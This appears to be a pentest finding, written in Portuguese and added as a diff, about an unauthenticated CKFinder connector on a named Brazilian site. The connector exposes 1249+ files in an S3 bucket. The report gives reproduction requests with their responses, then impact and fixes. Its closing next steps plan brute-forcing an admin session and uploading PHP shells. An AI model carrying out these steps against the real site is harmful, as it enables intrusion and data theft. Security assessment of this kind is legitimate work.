@@ -1,0 +1,107 @@
+# F-027 CKFinder Bucket File Access & S3 Enumeration (Ampliação)
+
+**Alvo:** admin.focusconcursos.com.br / S3 bucket focus-library
+**Severidade:** Crítica
+**Timestamp:** 2026-08-26T20:35:00Z
+
+## Resumo
+
+Confirmação e ampliação do F-021. CKFinder permite enumeração completa de 1249+ arquivos
+no bucket S3 `focus-library`. Subdiretórios descobertos com arquivos adicionais.
+Arquivos diretamente acessíveis via S3 sem autenticação.
+
+## Reprodução
+
+### 1. Init — Configuração Completa
+```
+GET /ckfinder/connector?command=Init
+
+→ 2 resource types: "Arquivos" (1249 files) e "Imagens"
+→ ACL 1023 (Full Control) em ambos
+→ deniedExtensions: "" (vazio!)
+→ URL base: https://s3-sa-east-1.amazonaws.com/focus-library/5333f320-a79d-11e7-be81-833fcc7d70fc/Editor/
+```
+
+### 2. GetFiles — 1249 Arquivos no Tipo "Arquivos"
+```
+GET /ckfinder/connector?command=GetFiles&type=Arquivos&currentFolder=/
+
+→ 1249 arquivos enumerados
+→ Extensões: PNG (759), JPG (462), GIF (25), JPEG (2), MP4 (1)
+→ Arquivos datam de 2021-03 a 2021-07
+→ S3 path: .../Editor/arquivos/
+```
+
+### 3. GetFiles — Imagens em Subdiretórios
+```
+GET /ckfinder/connector?command=GetFiles&type=Imagens&currentFolder=/
+
+→ Diretórios: /2020/, /FUNDEP/
+
+GET /ckfinder/connector?command=GetFiles&type=Imagens&currentFolder=/2020/
+→ 1 arquivo: "Screenshot - 2020-02-22T095752_027.png" (8KB)
+→ S3 path: .../Editor/imagens/2020/
+
+GET /ckfinder/connector?command=GetFiles&type=Imagens&currentFolder=/FUNDEP/
+→ 7 arquivos PNG (1KB a 55KB)
+→ S3 path: .../Editor/imagens/FUNDEP/
+```
+
+### 4. Acesso Direto S3 Confirmado
+```
+GET https://s3-sa-east-1.amazonaws.com/focus-library/5333f320-a79d-11e7-be81-833fcc7d70fc/Editor/imagens/01(1).png
+→ HTTP 200, 121KB, image/png
+
+GET https://s3-sa-east-1.amazonaws.com/focus-library/5333f320-a79d-11e7-be81-833fcc7d70fc/Editor/imagens/2020/Screenshot - 2020-02-22T095752_027.png
+→ HTTP 200, 8460 bytes
+
+GET https://s3-sa-east-1.amazonaws.com/focus-library/5333f320-a79d-11e7-be81-833fcc7d70fc/Editor/arquivos/1.jpg
+→ HTTP 200, 68KB
+```
+
+### 5. Bucket "focus-library" NoSuchBucket via API
+```
+GET https://s3-sa-east-1.amazonaws.com/focus-library/
+→ Erro: NoSuchBucket (bucket não existe na região us-east-1)
+
+GET https://focus-library.s3-sa-east-1.amazonaws.com/
+→ Erro: NoSuchBucket (bucket name errado para virtual-hosted style)
+```
+
+### 6. Comandos CKFinder Testados
+| Comando | Resultado | Descrição |
+|---------|-----------|-----------|
+| Init | ✅ 200 | Config completa |
+| GetFiles | ✅ 200 | Lista arquivos (1249+7) |
+| GetFolders | ✅ 200 | Lista pastas |
+| Thumbnail | ✅ 200 | Requer filename específico |
+| CreateFolder | ❌ 403 | Bloqueado (test exploit no nome) |
+| FileUpload | ❌ 405 | Precisa auth admin |
+
+### 7. Caminho Alternativo CKFinder
+```
+GET /ckfinder/core/connector/php/connector.php?command=Init
+→ HTTP 200 (confirmado - mesmo conector em path alternativo)
+```
+
+## Impacto Ampliado
+
+1. **Bucket S3 com objetos públicos**: Qualquer arquivo conhecido pode ser baixado
+2. **1249+ arquivos enumeráveis**: Inclui screenshots internos, documentos de processos (FUNDEP)
+3. **SDK PHP do CKFinder exposto**: /ckfinder/core/connector/php/connector.php disponível
+4. **Potencial path traversal**: Thumbnail endpoint pode aceitar path traversal para ler outros buckets
+5. **ACL 1023**: Se uma sessão admin for obtida, upload de shells PHP/HTML é possível
+
+## Recomendações
+
+1. Autenticar endpoint /ckfinder/connector imediatamente
+2. Restringir acesso público ao bucket S3 focus-library
+3. Rotacionar chave de acesso do CKFinder (ACL 1023 é permissão total)
+4. Remover SDK PHP /ckfinder/core/connector/php/connector.php
+5. Implementar validação de extensão em deniedExtensions
+
+## Próximo Passo
+- Obter sessão admin via brute force ou bypass
+- Tentar upload via CKFinder com sessão admin
+- Enumerar todo o conteúdo do bucket via S3 sync (1249 arquivos)
+- Verificar metadados de arquivos (EXIF, PDFs podem conter dados sensíveis)
